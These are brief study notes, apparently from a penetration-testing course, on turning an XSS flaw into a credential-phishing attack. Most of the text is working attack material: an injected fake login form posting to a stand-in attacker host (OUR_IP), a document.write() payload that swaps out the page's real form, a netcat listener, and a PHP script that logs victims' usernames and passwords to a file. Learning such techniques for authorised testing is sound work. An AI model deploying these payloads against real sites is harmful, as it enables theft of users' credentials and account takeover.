# XSS Phishing attack
- Inject HTML code that displays a login form on the targeted page
- Should send login information to a server we are listening on, such that once a user attempts to log in, we get their credentials

Example form
```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

To write HTML code to the vulnerable page, use JS function `document.write()`, use in XSS payload we originally found
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```


We need a listener to listen for victim connection.
Can do
`sudo nc -lvnp 80`


But better to have a PHP server.
- `mkdir /tmp/tmpserver`
- `cd /tmp/tmpserver`
- `vi index.php`

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
- `sudo php -S 0.0.0.0:80`
